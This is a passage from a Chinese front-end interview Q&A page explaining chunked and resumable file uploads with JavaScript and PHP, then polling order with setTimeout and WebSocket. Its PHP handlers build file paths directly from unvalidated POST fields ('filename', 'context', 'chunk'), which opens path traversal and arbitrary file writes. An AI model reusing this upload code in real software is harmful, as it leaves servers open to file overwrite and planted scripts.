 <span class="token keyword">let</span> end <span class="token operator">=</span> start <span class="token operator">+</span> piece<span class="token punctuation">;</span> <span class="token comment">// 每次上传的结尾字节</span>
 <span class="token keyword">let</span> chunks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
 <span class="token keyword">while</span> <span class="token punctuation">(</span>start <span class="token operator">&lt;</span> totalSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// 根据长度截取每次需要上传的数据</span>
 <span class="token comment">// File对象继承自Blob对象，因此包含slice方法</span>
 <span class="token keyword">let</span> blob <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span> 
 chunks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>
 start <span class="token operator">=</span> end<span class="token punctuation">;</span>
 end <span class="token operator">=</span> start <span class="token operator">+</span> piece<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">return</span> chunks
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"[name=file]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">LENGTH</span> <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">0.1</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> chunks <span class="token operator">=</span> <span class="token function">slice</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token constant">LENGTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 首先拆分切片</span>
chunks<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
 <span class="token keyword">let</span> fd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">,</span> chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/mkblk.php'</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">$filename <span class="token operator">=</span> <span class="token string">'./upload/'</span> <span class="token punctuation">.</span> $_POST<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//确定上传的文件名</span>
<span class="token comment">//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
 <span class="token function">file_put_contents</span><span class="token punctuation">(</span>$filename<span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 echo $filename<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">server <span class="token punctuation">&#123;</span>
  <span class="token comment">// ...</span>
  client_max_body_size 50m<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面这种方式来存在一些问题</p>
<ul>
<li>无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错</li>
<li>切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的</li>
</ul>
<p>因此接下来我们来看看应该如何在服务端还原切片。</p>
<p><strong>还原切片</strong></p>
<p>在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题</p>
<ul>
<li>如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数</li>
<li>如何将多个切片还原成一个文件</li>
<li>确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接</li>
<li>找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值</li>
<li>按顺序拼接切片，还原成文件</li>
</ul>
<p>上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取</p>
<ul>
<li>根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性</li>
<li>根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.</li>
</ul>
<p>修改上传代码，增加相关参数</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 获取context，同一个文件会返回相同的值</span>
<span class="token keyword">function</span> <span class="token function">createContext</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> file<span class="token punctuation">.</span>name <span class="token operator">+</span> file<span class="token punctuation">.</span>length
<span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"[name=file]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">LENGTH</span> <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">0.1</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> chunks <span class="token operator">=</span> <span class="token function">slice</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token constant">LENGTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 获取对于同一个文件，获取其的context</span>
<span class="token keyword">let</span> context <span class="token operator">=</span> <span class="token function">createContext</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
chunks<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">chunk<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">let</span> fd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">,</span> chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 传递context</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 传递切片索引值</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"chunk"</span><span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 tasks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/mkblk.php"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 所有切片上传完毕后，调用mkfile接口</span>
Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">let</span> fd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"chunks"</span><span class="token punctuation">,</span> chunks<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/mkfile.php"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在mkblk.php接口中，我们通过context来保存同一个文件相关的切片</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// mkblk.php</span>
$context <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'context'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$path <span class="token operator">=</span> <span class="token string">'./upload/'</span> <span class="token punctuation">.</span> $context<span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token function">mkdir</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 把同一个文件的切片放在相同的目录下</span>
$filename <span class="token operator">=</span> $path <span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span> $_POST<span class="token punctuation">[</span><span class="token string">'chunk'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$res <span class="token operator">=</span> <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// mkfile.php</span>
$context <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'context'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$chunks <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span>$_POST<span class="token punctuation">[</span><span class="token string">'chunks'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">//合并后的文件名</span>
$filename <span class="token operator">=</span> <span class="token string">'./upload/'</span> <span class="token punctuation">.</span> $context <span class="token punctuation">.</span> <span class="token string">'/file.jpg'</span><span class="token punctuation">;</span> 
<span class="token keyword">for</span><span class="token punctuation">(</span>$i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> $i <span class="token operator">&lt;=</span> $chunks<span class="token punctuation">;</span> <span class="token operator">++</span>$i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 $file <span class="token operator">=</span> <span class="token string">'./upload/'</span><span class="token punctuation">.</span>$context<span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span>$i<span class="token punctuation">;</span> <span class="token comment">// 读取单个切块</span>
 $content <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 $fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
 $fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">fwrite</span><span class="token punctuation">(</span>$fd<span class="token punctuation">,</span> $content<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将切块合并到一个文件上</span>
<span class="token punctuation">&#125;</span>
echo $filename<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样就解决了上面的两个问题：</p>
<ul>
<li>识别切片来源</li>
<li>保证切片拼接顺序</li>
</ul>
<p><strong>断点续传</strong></p>
<p>即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过<strong>断点续传</strong>来进行处理。</p>
<p>断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。</p>
<p>由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：</p>
<ul>
<li>在切片上传成功后，保存已上传的切片信息</li>
<li>当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传</li>
<li>所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并</li>
</ul>
<p>因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略</p>
<ul>
<li>可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失</li>
<li>服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录</li>
</ul>
<p>下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 获取已上传切片记录</span>
<span class="token keyword">function</span> <span class="token function">getUploadSliceRecord</span><span class="token punctuation">(</span><span class="token parameter">context</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">let</span> record <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>record<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 保存已上传切片</span>
<span class="token keyword">function</span> <span class="token function">saveUploadSliceRecord</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span> sliceIndex</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">let</span> list <span class="token operator">=</span> <span class="token function">getUploadSliceRecord</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span>
 list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>sliceIndex<span class="token punctuation">)</span>
 localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> context <span class="token operator">=</span> <span class="token function">createContext</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 获取上传记录</span>
<span class="token keyword">let</span> record <span class="token operator">=</span> <span class="token function">getUploadSliceRecord</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
chunks<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">chunk<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// 已上传的切片则不再重新上传</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span>record<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">return</span>
 <span class="token punctuation">&#125;</span>

 <span class="token keyword">let</span> fd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">,</span> chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>
 fd<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"chunk"</span><span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> task <span class="token operator">=</span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/mkblk.php"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
 <span class="token comment">// 上传成功后保存已上传切片记录</span>
 <span class="token function">saveUploadSliceRecord</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> index<span class="token punctuation">)</span>
 record<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 tasks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。</p>
<p>服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。</p>
<p>此外断点续传还需要考虑<strong>切片过期</strong>的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。</p>
<p><strong>上传进度和暂停</strong></p>
<p>通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。</p>
<p>上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。</p>
<p>由于篇幅关系，上传进度和暂停的功能这里就先不实现了。</p>
<h3 id="45、使用setInterval请求实时数据，返回顺序不一致怎么解决"><a href="#45、使用setInterval请求实时数据，返回顺序不一致怎么解决" class="headerlink" title="45、使用setInterval请求实时数据，返回顺序不一致怎么解决"></a>45、使用setInterval请求实时数据，返回顺序不一致怎么解决</h3><p><strong>参考答案：</strong></p>
<p>场景：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/path/to/server"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。</p>
<p>解决方案：</p>
<ol>
<li><p>使用setTimeout代替setInterval</p>
<p>程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/path/to/server"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 发起下一次请求</span>
            <span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>WebSocket</p>
<p>WebSocket 协议本质上是一个基于 TCP 的协议。</p>
<p>为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，<strong>并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。</strong></p>
<p>服务器（Node.js）：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> WebSocketServer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ws'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Server<span class="token punctuation">;</span>
<span class="token keyword">var</span> wss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">8080</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

wss<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"connection"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Nice to meet you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// WebSocket 为客户端JavaScript的原生对象</span>
<span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">"ws://localhost:8080"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
